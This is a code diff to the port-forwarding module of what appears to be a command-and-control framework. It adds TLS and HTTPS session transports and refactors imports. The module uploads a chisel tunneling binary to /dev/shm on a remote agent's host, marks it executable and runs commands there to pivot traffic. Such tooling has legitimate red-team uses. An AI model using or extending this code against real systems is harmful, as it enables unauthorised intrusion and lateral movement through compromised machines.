@@ -5,7 +5,8 @@ import threading
 import base64
 import os
 import subprocess
-from core import session_manager, shell
+from core import shell
+from core.session_handlers import session_manager
 from core.utils import register_forward, unregister_forward
 from colorama import init, Fore, Style
 
@@ -28,7 +29,7 @@ def portfwd_listener(rule_id, sid,
         return
 
     transport = getattr(session, "transport", None)
-    if transport not in ("tcp", "http"):
+    if transport not in ("tcp", "http", "tls", "https"):
         print(brightred + f"[!] Session {sid} transport '{transport}' not supported")
         return
 
@@ -37,7 +38,7 @@ def portfwd_listener(rule_id, sid,
 
     def exec_cmd(cmd_str):
         """Send cmd_str to the agent and return decoded stdout."""
-        if transport == "tcp":
+        if transport in ("tcp", "tls"):
             with lock:
                 return shell.run_command_tcp(sid, cmd_str)
         else:
@@ -52,10 +53,15 @@ def portfwd_listener(rule_id, sid,
         # 1) upload chisel binary to agent
         local_chisel  = "core/binaries/chisel"
         remote_chisel = "/dev/shm/chisel"
+
         if transport == "http":
             shell.upload_file_http(sid, local_chisel, remote_chisel)
-        else:
+
+        elif transport in ("tcp", "tls"):
             shell.upload_file_tcp(sid, local_chisel, remote_chisel)
+
+        else:
+            print(brightred + f"[-] ERROR unsupported session type!")
 
         # 2) make it executable
         exec_cmd(f"chmod +x {remote_chisel}")
@@ -191,7 +197,7 @@ def portfwd_listener(rule_id, sid,
     try:
         while True:
             client, _ = listener.accept()
-            handler = handle_tcp if transport == "tcp" else handle_http
+            handler = handle_tcp if transport in ("tcp", "tls") else handle_http
             threading.Thread(
                 target=handler,
                 args=(client,),
